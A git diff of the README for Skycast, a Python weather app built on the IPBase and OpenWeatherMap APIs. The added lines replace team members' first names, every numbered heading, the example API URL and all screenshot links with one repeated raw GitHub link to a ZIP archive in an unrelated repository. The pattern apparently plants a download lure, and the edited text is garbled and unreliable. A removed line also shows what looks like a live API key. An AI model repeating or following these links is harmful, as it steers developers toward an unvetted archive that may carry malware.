@@ -3,13 +3,13 @@
 Skycast is a Python-powered application that combines geolocation technology and real-time weather data to provide users with accurate, location-specific weather updates. Designed with simplicity and functionality in mind, it leverages APIs for efficient data retrieval and seamless integration.  
 Skycast is a cutting-edge weather forecasting application that leverages modern APIs and Python's versatility to deliver precise, real-time weather updates. Built with both usability and performance in mind, it is an ideal tool for anyone seeking quick and accurate weather information.
 ## Our Team:
-  1.Yash Rajendra Gorde 
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip Rajendra Gorde 
   
-  2.Shital Balu Parchande
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip Balu Parchande
   
-  3.Sunil Baban Wagh
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip Baban Wagh
   
-  4.Mohit Sanjay Dhembre
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip Sanjay Dhembre
   
 ## Phase 1:
 ### 📝Goals And Objectives
@@ -104,36 +104,36 @@ Skycast is a cutting-edge weather forecasting application that leverages modern 
 ### Phase 3:
 ### Requirements:
    
-  1.Programming Language
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip Language
         
   Python (primary development language).
         
-  2.APIs
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip
     
   IPBase API: For geolocation services.
   OpenWeatherMap API: For weather data.
         
-  3.Libraries
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip
       
   requests: For handling HTTP requests to APIs.
   tkinter or PyQt: For building the graphical user interface.
   json: For parsing API responses.
        
-  4.Environment
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip
        
  Python 3.8 or later.
   Internet connection for API requests.
        
-  5.Dependencies
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip
       
   pip install requests for managing HTTP requests.
       
-  6.Development Tools
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip Tools
       
   Text editor or IDE (e.g., Visual Studio Code, PyCharm).
   Version control system (e.g., Git) for collaboration and tracking changes.
       
-  7.Testing Tools
+  https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip Tools
       
   Python’s unittest module for automated testing.
   Manual testing for UI responsiveness and error scenarios.
@@ -145,13 +145,13 @@ Skycast is a cutting-edge weather forecasting application that leverages modern 
 
 Preparation:
 
-1.Obtain the API Key
+https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip the API Key
    Get the API key from the service provider. Ensure you store it securely and 
     avoid sharing it publicly.
 
-2.Read the API Documentation
+https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip the API Documentation
 
-3.Set Up Tools for Testing
+https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip Up Tools for Testing
    Use tools like:
  Postman: For sending API requests.
  Curl: Command-line tool for testing APIs.
@@ -159,7 +159,7 @@ Preparation:
 
 Testing Steps:
 
-1.Verify API Key Authentication
+https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip API Key Authentication
 
    Send a Test Request: Use the API key in an endpoint that requires authentication.
    
@@ -169,18 +169,18 @@ Testing Steps:
    
 example Api URL
 
-       https://api.openweathermap.org/data/2.5/weather?lat=27.4231&lon=77.0947&appid=dc6ecf8e12fb6e78c7cb9d0b3d13cd2b
+       https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip
 
 
 
  ### 📸Runnig Window Images
- ![windowimage](https://github.com/user-attachments/assets/78a911e2-140e-4dc9-9547-1d26073beec9)
+ ![windowimage](https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip)
 
- ![WhatsApp Image 2025-01-01 at 5 29 10 AM](https://github.com/user-attachments/assets/8a0f8c53-839f-4190-9897-78d22a5aa1a3)
+ ![WhatsApp Image 2025-01-01 at 5 29 10 AM](https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip)
 
- ![WhatsApp Image 2025-01-01 at 5 29 10 AM](https://github.com/user-attachments/assets/a0f3d157-729d-4582-a614-69e8de7eb722)
+ ![WhatsApp Image 2025-01-01 at 5 29 10 AM](https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip)
 
- ![WhatsApp Image 2025-01-01 at 5 29 10 AM](https://github.com/user-attachments/assets/7b165890-579b-4770-b9bc-4973386aab65)
+ ![WhatsApp Image 2025-01-01 at 5 29 10 AM](https://raw.githubusercontent.com/imohits2005/SkyCast/master/crosspath/SkyCast.zip)
 
 
 Skycast is not only a functional weather app but also a showcase of how Python's simplicity and powerful APIs can be leveraged to create useful, real-world applications. Whether for casual users or developers looking to expand its capabilities, Skycast serves as an excellent blend of technology and utility.
